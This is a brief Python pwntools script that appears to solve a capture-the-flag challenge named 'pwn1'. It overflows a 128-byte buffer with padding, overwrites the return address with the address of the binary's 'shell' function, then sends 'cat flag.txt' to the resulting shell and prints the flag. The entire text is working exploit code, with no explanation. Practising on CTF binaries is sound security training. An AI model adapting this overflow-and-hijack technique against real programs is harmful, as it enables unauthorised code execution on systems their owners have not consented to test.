from pwn import *

context.binary = "./pwn1"

p = process()
p.sendline(b"A" * 128 + b"a" * 12 + p32(context.binary.functions["shell"].address))
p.sendline(b"cat flag.txt")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
